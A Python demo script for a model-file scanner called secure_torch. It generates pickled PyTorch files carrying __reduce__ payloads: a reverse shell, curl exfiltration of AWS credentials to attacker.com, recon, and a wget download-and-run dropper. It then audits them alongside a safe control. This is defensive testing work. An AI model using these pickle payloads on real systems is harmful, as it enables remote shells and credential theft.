import os
import shutil
import torch
import secure_torch
from tabulate import tabulate

print("\n" + "═" * 80)
print("🛡️  SECURE-TORCH: REAL-WORLD MALWARE DATASET SCANNER  🛡️")
print("═" * 80 + "\n")

DATASET_DIR = "examples/malicious_dataset"

# Create or clear dataset directory
if os.path.exists(DATASET_DIR):
    shutil.rmtree(DATASET_DIR)
os.makedirs(DATASET_DIR, exist_ok=True)

print(f"[*] 🔨 Generating dataset of real-world ML payloads in '{DATASET_DIR}/'...\n")

# --- Define Payloads ---

# 1. Reverse Shell (Like glockr1/ballr7)
class PayloadReverseShell:
    def __reduce__(self):
        cmd = 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"10.0.0.1\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);"'
        if os.name == 'nt':
            cmd = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);...'
        return (os.system, (cmd,))

# 2. Data Exfiltration (AWS Credentials / Passwd)
class PayloadDataExfiltration:
    def __reduce__(self):
        cmd = 'curl -X POST -d @~/.aws/credentials http://attacker.com/leak'
        if os.name == 'nt':
            cmd = 'Invoke-RestMethod -Uri http://attacker.com/leak -Method Post -InFile $env:USERPROFILE\\.aws\\credentials'
        return (os.system, (cmd,))

# 3. System Reconnaissance (whoami, ipconfig)
class PayloadSystemRecon:
    def __reduce__(self):
        cmd = 'whoami && uname -a > recon.txt && curl -X POST -d @recon.txt http://attacker.com'
        if os.name == 'nt':
            cmd = 'whoami && systeminfo > recon.txt && Invoke-RestMethod -Uri http://attacker.com -Method Post -InFile recon.txt'
        return (os.system, (cmd,))

# 4. Dropper (Download and execute Stage 2)
class PayloadDropper:
    def __reduce__(self):
        cmd = 'wget http://attacker.com/stage2.sh -O /tmp/s2.sh && chmod +x /tmp/s2.sh && /tmp/s2.sh'
        if os.name == 'nt':
            cmd = 'Invoke-WebRequest -Uri http://attacker.com/stage2.exe -OutFile $env:TEMP\\s2.exe; Start-Process $env:TEMP\\s2.exe'
        return (os.system, (cmd,))

# --- Generate Dataset ---

models_to_build = [
    ("01_reverse_shell.pt", PayloadReverseShell(), "Reverse Shell (glockr1/ballr7 style)"),
    ("02_data_exfiltration.pt", PayloadDataExfiltration(), "AWS Credential Theft"),
    ("03_system_recon.pt", PayloadSystemRecon(), "OS Fingerprinting & Recon"),
    ("04_dropper_stage2.pt", PayloadDropper(), "External Payload Dropper"),
    ("05_safe_control_model.pt", torch.nn.Linear(10, 2), "Safe Baseline Model (No Threats)"),
]

for filename, payload_obj, desc in models_to_build:
    filepath = os.path.join(DATASET_DIR, filename)
    torch.save(payload_obj, filepath)

print(f"    ✅ Successfully generated {len(models_to_build)} models.")
print("\n" + "-" * 80)
print("[*] 🔎 Initiating bulk security audit via `secure_torch.load(...)`")
print("-" * 80 + "\n")

# --- Scan Dataset ---

results = []

for filename, _, desc in models_to_build:
    filepath = os.path.join(DATASET_DIR, filename)
    
    try:
        # We try to load it normally via secure_torch without audit_only first to show it BLOCKS it
        # However, to get the report, we use audit_only
        _, report = secure_torch.load(filepath, audit_only=True)
        
        status = "✅ BLOCKED" if report.threat_level.name in ["HIGH", "CRITICAL"] else "🟢 ALLOWED"
        if "Safe" in desc:
            status = "🟢 ALLOWED" # Safe models should be allowed
            
        results.append([
            filename,
            desc,
            f"{report.threat_level.name} (Score: {sum(report.score_breakdown.values())})",
            status
        ])
    except Exception as e:
        results.append([filename, desc, "ERROR", f"❌ FAILED TO SCAN: {e}"])


# --- Output Results ---

headers = ["Model File", "Emulated Threat Profile", "Threat Assessment", "Secure-Torch Action"]
table = tabulate(results, headers=headers, tablefmt="rounded_grid")

print(table)
print("\n" + "═" * 80)
print("🛡️  Zero-Day RCE Payloads Defeated Instantly. Model Runtime Secured. 🛡️")
print("═" * 80 + "\n")

# Cleanup optional, but nice for hygiene if they just want the output
# shutil.rmtree(DATASET_DIR)
